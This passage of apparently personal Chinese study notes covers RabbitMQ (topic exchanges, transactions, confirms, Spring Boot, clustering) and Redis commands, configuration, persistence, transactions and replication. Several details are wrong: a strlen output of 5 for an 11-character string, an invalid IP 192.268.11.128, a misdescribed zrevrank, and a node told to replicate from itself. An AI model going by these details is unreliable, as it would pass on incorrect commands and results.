factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            String message = &quot;hello topic MQ!&quot;;            channel.exchangeDeclare(&quot;topicExchange&quot;, &quot;topic&quot;, true);            channel.basicPublish(&quot;topicExchange&quot;, &quot;aa.a&quot;, null, message.getBytes(StandardCharsets.UTF_8));            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\nfanout与topic使用场景对比topic 类型的交换机和 fanout 类型的交换机一样，都是一对多的交换机类型，都可以实现将一个消息同时发送给多个队列 \nfanout 更适合于使用在一个功能不同的进程来获取数据例如手机app中的消息推送，一个app可能会有很多用户安装，然后他们都会启动一个随机队列来接受自己的数据\ntopic 更适合不同功能模块来接收同一个消息例如商城下单成功后需要发送消息到队列中假如 RoutingKey 为 order.success 。物流系统监听 order.* ；发票系统监听 order.*\nTopic 可以使用随机的队列名也可以使用明确的队列名，但如果功能比较重要，建议使用明确的队列名并要求持久化的队列。\n事务消息事务消息和数据库的事务类似，只是MQ中的消息要保证消息是否全部发送成功，防止信息都是的一种策略。\nRabbitMQ有两种方式来解决这个问题：\n\n通过AMQP提供的事务机制实现\n使用发送者确认模式实现（效率要高一些）\n\n启用事务发送消息：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class SendTransaction &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            String message = &quot;hello Transaction!&quot;;            channel.queueDeclare(&quot;transactionQueue&quot;, true, false, false, null);            channel.exchangeDeclare(&quot;transactionExchange&quot;, &quot;direct&quot;, true);            channel.queueBind(&quot;transactionQueue&quot;, &quot;transactionExchange&quot;, &quot;transactionRoutingKey&quot;);            //启动一个事务，启动事务后所有写入到队列的消息必须显式地调用 txCommit 提交事务或txRollback 回滚事务            channel.txSelect();            channel.basicPublish(&quot;transactionExchange&quot;, &quot;transactionRoutingKey&quot;, null, message.getBytes(StandardCharsets.UTF_8));            channel.basicPublish(&quot;transactionExchange&quot;, &quot;transactionRoutingKey&quot;, null, message.getBytes(StandardCharsets.UTF_8));            //提交事务，如果调用 txSelect 启动了事务，必须显示调用事物的提交            //否则消息不会真正写入队列，提交后会将内存中的消息写入队列并释放内存            channel.txCommit();            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    //回滚事务，放弃当前事务中所有没有提交的消息，释放内存                    channel.txRollback();                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n\n当消费者开启事务后，即使不做提交。依然可以获取队列中的消息并且消息从队列中移除暂时 事务对接收者没有影响\n\n发送者确认模式Confirm 发送方确认模式使用和事务类似，也是通过设置 channel 进行发送方确认的，最终达到确保所有消息全部发送成功的目的。\n代码大部分相同（加减几行的区别），就不单独贴代码块了。上面大段重复好难受\n启用发送者确认模式channel.confirmSelect();\n方式一：channel.waiForConfirms() 普通发送方确认模式可以有一个参数，超时时间（毫秒值）\n会阻塞线程等待服务返回响应，用于是否消息发送成功，如果服务器确认消息已经发送完成则返回true，都则返回false可以给这个方法一个毫秒值用于确认我们的需要等待服务确认的时间如果超过了指定时间以后则会抛出异常 InterruptedException 表示服务器出现了问题需要补发消息或将消息缓存到 redis 中，稍后利用定时任务补发无论返回false还是抛出异常，消息都有可能发送成功或发送失败如果要求这个消息一定要发送到队列，那么可以采用消息补发（重新发送）\n方式二：channel.waitForConfirmsOrDie() 批量确认模式它会向服务中确认之前当前通道中发送的所有消息是否已经全部写入成功这个方法没有返回值，如果服务器中有一条消息没有能够成功或向服务器发送确认时服务不可访问，都被认定为消息发送失败。可能有消息没有发送成功，需要进行消息补发如果无法向服务器获取确认信息，那么方法会抛出 InterruptedException 异常，这时就需要补发这个方法也可以指定超时时间，同上\n\n批量消息确认的速度比普通消息确认要快，但是一旦出现需要补发的情况，不能确认具体是哪条消息没有发送完成，需要将本次所有消息全部补发\n\n方式三：channel.addConfirmListener() 异步确认模式\n使用方法：\n/*异步消息确认监听器，需要在发送消息前启动 */channel.addConfirmListener(new ConfirmListener() &#123;    //消息确认以后的回调方法    /*    参数1 被确认的消息编号 从1开始自动递增标记当前是第几条消息    参数2 当前消息是否同时确认了多个    注意：如果参数2为true，则表示本次确认同时确认了多条消息；如果为false，则表示之确认了当前编号的消息     */    @Override    public void handleAck(long l, boolean b) throws IOException &#123;    &#125;    //消息没有确认的回调方法，执行消息补发之类的操作    /*    参数1 没有被确认的消息编号 从1开始自动递增标记当前是第几条消息    参数2 当前消息是否同时没有确认了多个    注意：如果参数2为true 则表示小于当前编号的所有消息可能都没有发送成功，需要补发；为false 则表示当前编号的消息没有发送成功，需要补发     */    @Override    public void handleNack(long l, boolean b) throws IOException &#123;    &#125;&#125;);\n\n消费者确认模式为保证消息从队列可靠地到达消费者，消费者可以在队列声明时指定 noAck 参数，为 false 时，RabbitMQ会等待消费者显式发回ack信号后才从内存（和磁盘，如果持久化的话）中移去消息。否则，RabbitMQ会在队列中的消息被消费后立即删除它。\n手动确认主要使用以下方法：\nbasicAck() 用于肯定确认basicRecover() 路由不成功的消息，使用recover重新发送到队列basicReject() 拒收消息，可以设置是否放回到队列中。并且只能一次拒绝一条消息。批量拒绝消息使用 basicNack()basicNack() 可以一次拒绝多条消息\n//获取当前消息是否被接收过一次，false没被接受过，true被接收过，也可能处理完成，需要进行消息防重复处理envelope.isRedeliver();//获取消息的编号long deliveryTag = envelope.getDeliveryTag();//获取当前内部类的通道Channel c = this.getChannel();//手动确认这个消息，确认以后表示当前消息已经成功处理了，需要从队列中移除//这个方法应该在当前消息处理程序全部完成后执行//参数1 消息的序号//参数2 为是否确认多个，为true表示确认小等于当前编号的所有消息，false单个确认，确认当前消息//注意：如果启动事务，而消息确认模式为手动确认。那么必须要提交事务，否则即使调用确认调用方法，消息也不回从队列中移除c.basicAck(deliveryTag,true);\n\nspringboot集成RabbitMQ和上面单独使用Java进行收发消息的流程基本一致\nmaven依赖\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt;&lt;/dependency&gt;\n\n配置文件\nspring.rabbitmq.host=0.0.0.0spring.rabbitmq.port=5672spring.rabbitmq.username=rootspring.rabbitmq.password=root\n\n配置类（用于声明队列和交换机，以及绑定队列和交换机）\npackage com.example.springboottext.rabbitmq.config;import org.springframework.amqp.core.*;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class RabbitMQConfig &#123;    //配置一个Direct类型的交换机    @Bean    public DirectExchange directExchange() &#123;        return new DirectExchange(&quot;bootDirectExchange&quot;, true, false);    &#125;    //配置一个队列    @Bean    public Queue directQueue() &#123;        return new Queue(&quot;bootDirectQueue&quot;, true, false, false, null);    &#125;    /**     * 配置一个队列和交换机的绑定     *     * @param directQueue    需要绑定的队列对象，参数名必须要和某个@Bean的方法名完全相同以进行自动注入     * @param directExchange 需要绑定的交换机对象，参数名必须要和某个@Bean的方法名完全相同以进行自动注入     * @return     */    @Bean    public Binding directBinding(Queue directQueue, DirectExchange directExchange) &#123;        //完成绑定        // 参数1 需要绑定的队列        // 参数2 需要绑定的交换机        // 参数3 绑定时的RoutingKey        return BindingBuilder.bind(directQueue).to(directExchange).with(&quot;RoutingKey&quot;);    &#125;    //配置一个Fanout类型的交换机    @Bean    public FanoutExchange fanoutExchange() &#123;        return new FanoutExchange(&quot;fanoutExchange&quot;);    &#125;    //配置一个Topic类型的交换机    @Bean    public TopicExchange topicExchange() &#123;        return new TopicExchange(&quot;topicExchange&quot;);    &#125;&#125;\n\nService类（发送消息）\npackage com.example.springboottext.rabbitmq.service.impl;import com.example.springboottext.rabbitmq.service.SendService;import org.springframework.amqp.core.AmqpTemplate;import org.springframework.stereotype.Service;import javax.annotation.Resource;@Service(&quot;sendService&quot;)public class SendServiceImpl implements SendService &#123;    //注入amqp的模板类，里用这个对象来发送和接受消息    @Resource    private AmqpTemplate amqpTemplate;    @Override    public void sendMessage(String message) &#123;        /*        发送消息        参数1 交换机名        参数2 RoutingKey        参数3 具体消息         */        amqpTemplate.convertAndSend(&quot;bootDirectExchange&quot;, &quot;RoutingKey&quot;, message);    &#125;    @Override    public void sendFanoutMessage(String message) &#123;        amqpTemplate.convertAndSend(&quot;fanoutExchange&quot;, &quot;&quot;, message);    &#125;    @Override    public void sendTopicMessage(String message) &#123;        amqpTemplate.convertAndSend(&quot;topicExchange&quot;, &quot;aa&quot;, message);    &#125;&#125;\n\nService类（接收消息）\npackage com.example.springboottext.rabbitmq.service.impl;import com.example.springboottext.rabbitmq.service.ReceiveService;import org.springframework.amqp.core.AmqpTemplate;import org.springframework.amqp.rabbit.annotation.Exchange;import org.springframework.amqp.rabbit.annotation.Queue;import org.springframework.amqp.rabbit.annotation.QueueBinding;import org.springframework.amqp.rabbit.annotation.RabbitListener;import org.springframework.stereotype.Service;import javax.annotation.Resource;@Service(&quot;receiveService&quot;)public class ReceiveServiceImpl implements ReceiveService &#123;    @Resource    private AmqpTemplate amqpTemplate;    /**     * 这个接收不是不间断的接收消息，每执行一次只能接收一次。如果有新消息，不会自动接收     */    @Override    public void receive() &#123;        String bootDirectQueue = (String) amqpTemplate.receiveAndConvert(&quot;bootDirectQueue&quot;);        System.out.println(bootDirectQueue);    &#125;    /**     * @param message 接收到的具体消息数据     *                注意：如果当前监听方法正常结束Spring会自动确认消息，如果出现异常则不会确认消息     *                因此在消息处理时，应该做好消息的防重复处理     * @RabbitListener 注解用于标记当前方法是一个RabbitMQ的消息监听方法，作用是持续性的自动接收消息     * 这个方法不需要手动调用，Spring会自动运行这个监听     * queues 用于指定一个已经存在的队列名，用于进行队列的监听     */    @Override    @RabbitListener(queues = &quot;bootDirectQueue&quot;)    public void directReceive(String message) &#123;        System.out.println(message);    &#125;    @Override    @RabbitListener(bindings = &#123;            //@QueueBinding 注解完成队列和交换机的绑定            @QueueBinding(                    value = @Queue(), //@Queue 创建一个队列（没有指定参数则表示创建一个随机队列                    exchange = @Exchange(name = &quot;fanoutExchange&quot;, type = &quot;fanout&quot;) //@Exchange 创建一个交换机            )&#125;)    public void fanoutReceive01(String message) &#123;        System.out.println(&quot;01--&quot; + message);    &#125;    @Override    @RabbitListener(bindings = &#123;            @QueueBinding(                    value = @Queue(),                    exchange = @Exchange(name = &quot;fanoutExchange&quot;, type = &quot;fanout&quot;)            )&#125;)    public void fanoutReceive02(String message) &#123;        System.out.println(&quot;02--&quot; + message);    &#125;    @Override    @RabbitListener(bindings = &#123;            @QueueBinding(                    value = @Queue(&quot;topic01&quot;),                    key = &quot;aa&quot;,                    exchange = @Exchange(name = &quot;topicExchange&quot;, type = &quot;topic&quot;))    &#125;)    public void topicReceive01(String message) &#123;        System.out.println(&quot;01--&quot; + message);    &#125;    @Override    @RabbitListener(bindings = &#123;            @QueueBinding(                    value = @Queue(&quot;topic02&quot;),                    key = &quot;aa.*&quot;,                    exchange = @Exchange(name = &quot;topicExchange&quot;, type = &quot;topic&quot;))    &#125;)    public void topicReceive02(String message) &#123;        System.out.println(&quot;02--&quot; + message);    &#125;    @Override    @RabbitListener(bindings = &#123;            @QueueBinding(                    value = @Queue(&quot;topic03&quot;),                    key = &quot;aa.#&quot;,                    exchange = @Exchange(name = &quot;topicExchange&quot;, type = &quot;topic&quot;))    &#125;)    public void topicReceive03(String message) &#123;        System.out.println(&quot;03--&quot; + message);    &#125;&#125;\n\nRabbitMQ集群普通模式（默认）：对于Queue来说，消息实体只存在于其中的一个节点A&#x2F;B两个节点仅有相同的元数据，即队列结构。交换机的所有元数据在所有节点上是一致的，而队列的完整信息只有在创建它的节点上，各个节点仅有相同的元数据，即队列结构。当消息进入A节点的Queue中后，consumer从B节点拉取数据时，RabbitMQ会临时在A、B间进行消息传输，把A中的消息实体取出并经过B发送给consumer。所以consumer应尽量连接每个节点，从中取消息。即对于同一个逻辑队列要在多个节点建立物理Queue，否则无论consumer连A或B，出口总在A，会产生瓶颈。该模式存在一个问题就是当A节点故障后，B节点无法取到A节点中还未消费的消息实体。如果做个消息持久化，那么等A节点恢复，然后才可被消费；如果没有做持久化，那就会丢失消息。该模式非常适合非持久化队列，只有该队列是非持久化的，客户端才能重新连接到集群中的其他节点，并且重新创建队列。如果该队列是持久化的，那么唯一的办法就是将故障节点恢复起来。\n镜像模式（高可用模式）：把需要的队列做成镜像模式，存在于多个节点数据Rabbitmg的HA方案。该模式解决了上述问题，其实质和普通模式的不同之处在于，消息实体会主动在镜像节点间同步，而不会在consumer取数据时临时拉取。该模式带来的副作用也很明显，除了降低系统性能以外，如果镜像队列过多，加之有大量的消息进入，集群内部的网铬带宽将会被这种同步通讯大大消耗掉，所以在对可靠性要求较高的场合中适用。\n配置集群\n配置cookie文件Erlang Cookie 是保障不同节点可以互相通信的密钥，要保证集群中不同节点互相通信，必须共享相同的 Erlang Cookie，具体存放在 /var/lib/rabbitmq/.erlang.cookie\n\n跨服务器拷贝 scp /var/lib/rabbitmq/.erlang.cookie ip:/var/lib/rabbitmq\n\n\n分别启动 RabbitMQ 服务\n\n将某个 RabbitMQ 加入到某个服务器节点rabbitmqctl stop_apprabbitmqctl join_cluster rabbit@Arabbitmqctl start_appA 为某个机器的 hostname；在 hostname 为B的机器中执行这些命令\n\n\n查看集群状态：rabbitmqctl cluster_status\nspringboot链接集群配置\nspring.rabbitmq.addresses=ip1:port,ip2:portspring.rabbitmq.username=rootspring.rabbitmq.password=root\n\n配置镜像模式任意节点执行：rabbitmqctl set_policy ha-all &quot;^&quot; &#39;{&quot;ha-mode&quot;:&quot;all&quot;}&#39;\n$ rabbitmqctl set_policy [-p Vhost] Name Pattern Definition [Priority]-p Vhost: 可选参数，针对指定vhost下的queue进行设置Name: policy的名称Pattern: queue的匹配模式(正则表达式)Definition: 镜像定义，包括三个部分ha-mode, ha-params, ha-sync-mode    ha-mode: 指明镜像队列的模式，有效值为 all/exactly/nodes        all: 表示在集群中所有的节点上进行镜像        exactly: 表示在指定个数的节点上进行镜像，节点的个数由ha-params指定        nodes: 表示在指定的节点上进行镜像，节点名称通过ha-params指定    ha-params: ha-mode模式需要用到的参数    ha-sync-mode: 进行队列中消息的同步方式，有效值为automatic和manualpriority: 可选参数，policy的优先级\n\n也可在web管控台中 Admin 中的 Policies 中进行配置。\n","categories":["学习笔记"],"tags":["RabbitMQ","消息队列"]},{"title":"Redis笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Redis%E7%AC%94%E8%AE%B0/","content":"关于RedisRedis官网Redis百度百科REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型。  \n使用Redis是为了解决多次读写数据库引发的性能问题。因为Redis是基于内存的数据库，所以它的性能十分优越，读的速度是110000次&#x2F;s,写的速度是81000次&#x2F;s。JavaWeb通常使用它存储缓存用的数据，以及需要高速读&#x2F;写的场合，以减少对基于硬盘的数据库的访问次数。\nRedis中的数据结构及操作命令Redis中的数据结构\n\n\n数据类型\n格式\n例子\n\n\n\nstring(字符串)\n单key:单value\nname:zhangsan\n\n\nlist(列表,按插入顺序)\n单key:多有序value\ncontacts:13952900000,xxx,xxx\n\n\nset(集合,无序且不重复,string类型)\n单key:多无序value\ncity:beijing shanghai shenzhen\n\n\nhash(哈希,适合存储对象)\n单key:对象(属性:值)\nstudent:id:1,name:zhangsan,age:20\n\n\nzset(有序集合,通过double类型分数排序)\n单key:多有序value\ncity:1000 beijing,1500 shanghai,2000 shenzhen\n\n\n关于键(key)的操作命令\n查看redis中的key: keys pattern(查找符合给定模式pattern的key)\nkeys *: 查看redis中所有的key(*匹配零或多个字符)\nkeys h?o: 查看redis中以h开头，o结尾且中间只有一个字符的key(?匹配一个字符)\nkeys h[abc]llo: 查看redis中以h开头，llo结尾，且中间为abc中一个的key([]匹配[]中的一个字符)\n\n\n判断key在redis中是否存在\nexists key(存在返回1，不存在返回0)\nexists key [key key key] (返回值为存在key的数量)\n\n\n移动指定key到指定的redis实例: move key index\nmove k1 1\n\n\n查看指定key的剩余生存时间: ttl key(key未设置生存时间，返回-1；key不存在，返回-2)\nttl k1\n\n\n设置key最大生命时间: expire key seconds(单位秒)\nexpire k2 20\n\n\n查看指定key的数据类型: type key\ntype k1\n\n\n重命名key: rename key newkey\nrename k1 k2\n\n\n删除指定key: del key [key key key](返回值是实际删除key的数量)\ndel k1 k2\n\n\n\n关于string类型数据的操作命令\n将string类型数据设置到redis中: set key value\nset name zhangsan\nset age 20\n\n\n从redis中获取string类型数据: get key\nget name\n&gt; zhangsan\nget age\n&gt; 20\n\n\n追加字符串: append key value(返回值为追加后字符串长度；如果key不存在，则创建并赋值)\nset phone 2333333\nappend phone 8888\n&gt; 23333338888\n\n\n获取字符串长度: strlen key\nstrlen phone\n&gt; 5\n\n\n将字符串数值进行加1运算: incr key(返回加1运算后的数据;key不存在，设置一个初始值为0的key，在进行incr运算；key的value不为数值，报错)\n将字符串数值进行减1运算: decr key(返回减1运算后的数据;key不存在，设置一个初始值为0的key，在进行decr运算；key的value不为数值，报错)\n将字符串数值进行加offset运算: incrby key offset(返回加offset运算后的数据;key不存在，设置一个初始值为0的key，在进行incrby运算；key的value不为数值，报错)\n将字符串数值进行减offset运算: decrby key offset(返回减offset运算后的数据;key不存在，设置一个初始值为0的key，在进行decrby运算；key的value不为数值，报错)\n获取字符串key中从startIndex到endIndex的子串: getrange key startIndex endIndex(闭区间，下标也可为负数)\nset k1 zhangsan\ngetrange k1 2 5\n&gt; angs\ngetrange k1 0 -1\n&gt; zhangsan\n\n\n用value覆盖从startIndex开始的字符串: setrange key startIndex value\nset k1 zhangsan\nsetrange k1 5 233\n&gt; zhang233\nsetrange k1 5 a\n&gt; zhanga33\n\n\n设置string数据同时，设置它的最大生命周期: setex key seconds value\nsetex k1 20 zhangsan\n\n\n设置string数据到redis中，不存在则设置；存在则放弃: setnx key value\nsetnx k1 20\n\n\n批量设置string数据到redis中: mset key1 value1 key2 value2 …\n批量获取string数据: mget key1 key2 …\n\n关于list类型数据的操作命令单key-多有序value多个value之间有顺序(插入顺序)，最左侧是表头，最右侧表尾。每个元素都有下标，表头元素下标是0。下标可以为负数\n\n将一个或多个值依次插入列表的表头: lpush key value [value value …]\nlpush list1 1 2 3\n\n\n获取指定列表中指定下标区间的元素: lrange key startIndex endIndex\nlrange list1 0 2\n&gt;3\n&gt;2\n&gt;1\n\n\n将一个或多个值依次插入列表的表尾: rpush key value [value value …]\nrpush list2 1 2 3\nlrange list2 0 2\n&gt;1\n&gt;2\n&gt;3\n\n\n从指定列表移除并返回表头: lpop key\n从指定列表移除并返回表尾: rpop key\n获取指定列表中指定下标的元素: lindex key index\nlindex list1 1\n&gt;2\n\n\n获取指定列表的长度: llen key\nllen list1\n&gt;3\n\n\n根据count值移除指定列表中跟value相等的数据: lrem key count valuecount&gt;0:从列表的左侧移除count个跟value相等的数据；count&lt;0:从列表的右侧移除count个跟value相等的数据；count&#x3D;0:从列表移除所有跟value相等的数据。\n截取指定列表指定区间组成新的列表，并赋值给key: ltrim key startIndex endIndex\n将指定列表指定下标元素设置为指定值: lset key index value\n将value插入到指定列表中位于pivot元素之前&#x2F;之后的位置: linsert key before&#x2F;after pivot value\n\n关于set类型数据的操作命令单key-多无序value无序且不重复，所以元素没有下标，直接操作数据。\n\n将一个或多个元素添加到指定集合: sadd key value [value value …]如果元素已经存在，则会忽略。返回成功加入的元素个数。\nsadd set1 a b c a\n\n\n获取指定集合中的所有元素: smembers key\nsmembers set1\n&gt;a\n&gt;c\n&gt;b\n\n\n判断指定元素在指定集合中是否存在: sismember key member存在返回1，不存在返回0。\n获取指定集合的长度: scard key\n移除指定集合中的一个或多个元素: srem key member [member member …]不存在的元素会被忽略返回成功移除的元素个数\n随机获取指定集合中的一个或多个元素: srandmember key [count]count&gt;0 随机获取的多个元素不能重复count&lt;0 随机获取的多个元素之间可能重复\n从指定集合中随机移除一个或多个元素: spop key [count]\n将指定集合中指定元素移动到另一个集合: smove source dest member\nsmove set1 set2 a\n\n\n获取第一个集合中有，但其他集合中没有的元素组成新的集合(差集): sdiff key key [key key …]\n获取所有指定集合中都有的元素组成新的集合(交集): sinter key key [key key …]\n获取所有指定集合中所有的元素组成新的集合(并集): sunion key key [key key …]\n\n关于hash类型数据的操作命令单key:field-value field-value …hash是string类型的key和value的映射表，value是一系列的键值对，适合存储对象\n\n将一个或多个field-value对设置到哈希表中: hset key field1 value1 [field2 value2 …]\nhset stu1 id 0001\nhset stu2 id 0002 name zhangsan\n\n\n获取指定哈希表中指定的field的值: hget key field\nhget stu1 id\n&gt;0001\n\n\n批量将多个field-value对设置到哈希表中: hmset key field1 value1 [field2 value2 …]\n批量获取指定哈希表在的field值: hmget key field1 [field2 field3 …]\n获取指定哈希表中所有的field和value: hgetall key\n从指定哈希表中删除一个或多个field: hdel key field1 [field1 field2 …]\n获取指定哈希表中所有的field个数: hlen key\n判断指定哈希表中是否存在某个field: hexists key field\n获取指定哈希表中所有的field列表: hkeys key\n获取指定哈希表中所有的value列表: hvals key\n对指定哈希表中指定的field值进行整数加法运算: hincrby key field int\n对指定哈希表中指定的field值进行浮点数加法运算: hincrbyfloat key field float\n将一个field-value对设置到指定哈希表中: hsetnx stu1 age 30当key-field已经存在，则放弃设置\n\n关于zset类型数据的操作命令有序集合，不允许重复元素。但zset集合中，每个元素会关联一个分数，redis根据分数对元素进行排序，分数可以重复。zset中每个元素都有顺序，所有每个元素也有下标。。\n\n将一个或多个member及其score值加入有序集合: zadd key score member [score member …]如果元素已经存在，则会覆盖其分数\nzadd zset1 1 a\n\n\n获取指定有序集合中指定下标区间的元素: zrange key startIndex endIndex [withscores]withscores 是否显示分数\n获取指定有序集合中指定分数区间(闭区间)的元素: zrangebysorce key min max [withscores]\n删除指定有序集合中的一个或多个元素: zrem key member [member …]\n获取指定有序集合中所有元素的个数: zcard key\n获取指定有序集合中分数在指定区间内的元素个数: zcount key min max\n获取指定有序集合中指定元素的排名(从0开始): zrank key member\n获取指定有序集合中指定元素的分数: zscore key member\n获取指定有序集合中指定元素的排名(按分数从小到大的排名): zrevrank key member\n\n命令小结\n上面的命令是部分常用的命令，写到这里感觉不如去看文档，不过写一遍也算是加深印象。菜鸟教程Redis  \n\nRedis的配置文件redis根目录下提供redis.conf配置文件如果不使用配置文件，redis按默认参数运行。如果使用配置文件，在启动redis服务时，必须指定所使用的配置文件。  \n关于网络的配置\nport：指定redis服务所使用的端口号，默认使用6379\nbind：配置客户端连接redis服务时，所能使用的ip地址，默认可以使用redis服务所在主机上任意一个ip都可以；一般情况会配置一个真实ip。  \n如果配置了port和bind，则客户端连接redis服务时，必须指定端口和ip：redis-cli -h 192.268.11.128 -p 6380redis-cli -h 192.268.11.128 -p 6380 shutdown\n\n\ntcp-keepalive：TCP连接保活策略。单位秒，每过多少秒向连接空闲的客户端发送一个ACK请求，以检查客户端是否挂掉，对于无响应的客户端会关闭连接。如果设置为0，则不会进行保活检测。\n\n常规配置\nloglevel：配置日志级别，开发阶段可以设置成debug，生产阶段通常设置为notice或waring。\nlogfile：指定日志文件。redis运行过程中会输出日志信息；默认会输出到控制台。\ndatabases：配置redis服务创建的数据库实例个数，默认16个。\n\n安全配置\nrequirepass：配置redis的访问密码。默认不配置密码。此参数必须在protected-mode&#x3D;yes(安全模式)是才起作用。\n\nRDB配置\nsave  ：配置复合的快照触发条件，即redis在seconds秒内key改变了changes次，会将快照内数据保存到磁盘一次。默认策略是：\n1分钟内改变1万次\n或5分钟内改变10次\n或15分钟内改变1次\n如果要禁用redis的持久化功能，吧所有的save配置注释即可。\n\n\nstop-writes-on-bgsave-erroe：在bgsave快照操作出错时停止写入磁盘，以保证数据一致性。如果出错时要继续写入，配置为no。\nrdbcompression：设置对存储到磁盘的快照是否压缩。yes会采用LZF算法进行压缩，no关闭此功能，可减少CPU消耗。\nrdbchecksum：快照存储后，可使用CRC64算法进行数据校验，会消耗一定性能，no关闭此功能。\nsdbfilename：持久化数据生成的文件名。默认为dump.rdb\ndir：持久化数据生成文件的保存目录。默认.&#x2F;即redis启动目录\n\nAOF配置\nappendonly：配置是否开启AOF，yes表示开启，no表示关闭。默认no\nappendfilename：AOF保存的文件名\nappendfsync：AOF异步持久化策略\nalways：同步持久化，每次发生数据变化立刻写入磁盘。性能差但数据安全。\neverysec：每秒异步记录一次。默认。\nno：不及时同步，由操作系统决定何时同步。\n\n\nno-appendfysnc-on-rewrite：重写时是否可以运用appendsync，默认no，可以保证数据安全性。\nauto-aof-rewrite-percentage：设置重写的基准百分比。\nauto-aof-rewrite-min-size：设置重写的基准值。\n\nRedis的持久化redis是内存数据库，数据存储在内存中，虽然加快了读取速度，但也对数据安全性产生新的问题。当服务器宕机后，redis数据库中所有数据会全部丢失，所以redis提供了持久化功能——RDB和AOF。\nRDB策略在指定时间间隔内，redis服务执行指定次数的写操作，会自动触发一次持久化操作。RDB策略是redis默认的持久化策略，在redis服务开启时，这种持久化策略默认开启。\nAOF策略采用操作日志来记录进行的每一次操作，每次redis启动时，都会重新执行一遍日志中的命令。效率低下，redis默认不开启。作为RDB策略的补充。\n持久化策略小结\n根据数据的特点来决定使用哪种策略，一般RDB足够。redis主要做缓存，数据在关系型数据库中有备份。\n\nRedis的事务事务：把一组数据库放在一起执行，保证操作的原子性，要么同时成功，要么同时失败。Redis的事务：允许把一组redis命令放在一起执行，把命令序列化，然后一起执行，保证部分原子性。\n\nmulti：用来标记一个事务的开始。\n压入事务队列\nmulti\nset k1 v1\nset k2 v2 \n…\n\n\nexec：用来执行事务队列中的所有命令。\nexec\n\n\nredis的事务只能保证部分原子性：\n如果一组命令中，在压入事务队列过程中发生错误，则本事务中所有命令都不执行，保证事务原子性。\n如果一组命令中，艾压入队列过程正常，但在执行事务队列命令时发生错误，则只会影响发生错误的命令，不会影响其他命令，不能保证事务的原子性。\n\n\ndiscard：清除所有已经压入队列中的命令，并且结束整个事务。\nmulti\nset k1 v1\nset k2 v2\ndiscard\n\n\nwatch：监控某一个键，当事务在执行过程中，此键代码的值发生变化，则本事务放弃执行；否则，正常执行。\nunwatch：放弃监控某一键\n\n\n事务小结：1.单独的隔离操作：事务中的所有命令会序列化、顺序地执行。执行过程中不会被其他客户端的命令请求打断，除非是用watch进行监视。2.不保证事务的原子性：同一事务如果某一命令执行失败，其他命令仍可能被继续执行，redis事务没有回滚。\n\nRedis消息的发布与订阅(了解)redis客户端订阅频道，消息的发布者往频道上发布消息，所有订阅此频道的客户端都能够接收到消息。\n\nsubscribe：订阅一个或多个频道的消息。\nsubscribe ch1 ch2 ch3\n\n\npublish：将消息发布到指定频道\npublish ch1 hello\n\n\npsubscribe：订阅一个或多个频道的消息，频道名支持通配符。\n\nRedis的主从复制主少从多，主写从读，读写分离，主写同步复制到从。\n搭建一主二从的redis集群：\n\n搭建三台redis服务：使用一台机器，三个不同端口模拟\n修改配置文件(bind、port等),以redis6379.conf为例\nbind 127.0.0.1\nport 6379\npidfile &#x2F;var&#x2F;run&#x2F;redis_6379.pid\nlogfile “6379.log”\ndbfilename dump6379.rdb\n启动服务\nredis-server redis6379.cond &amp;\nredis-server redis6380.cond &amp;\nredis-server redis6381.cond &amp;\n\n\n连接到redis服务\nredis-cli -h 127.0.0.1 -p 6379\nredis-cli -h 127.0.0.1 -p 6380\nredis-cli -h 127.0.0.1 -p 6381\n\n\n查看三台redis服务在集群中的主从角色：\ninfo replication\n默认情况下，所有的redis服务都是主机，既能读也能写，但都没有从机。\n\n\n设置主从关系：设从不设主\n在6380上执行：slaveof 127.0.0.1 6379\n在6381上执行：slaveof 127.0.0.1 6379\n\n\n全量复制：一旦主从关系确定，会自动把主机上已有的数据同步复制到从库\n增量复制：主库写数据会自动同步到从库\n主写从读，读写分离：\n在从机上进行写操作会报错\n\n\n主机宕机、从机原地待命：\n从机可以继续读，但数据不会再更新。\n\n\n主机恢复、一切恢复正常\n从机宕机、主机少一个从机，其他从机不变。\n从机恢复、需重新设置主从关系。\n从机上位：\n主机宕机、从机原地待命\n从机断开原来的主从关系\n在6380上执行：slaveof no one\n重新设置主从关系\n在6381上执行：slaveof 127.0.0.1 6380\n\n\n原主机恢复\n在6379上执行：slaveof 127.0.0.1 6379\n让6379变为6380的从机\n或者在6379上执行：slaveof 127.0.0.1 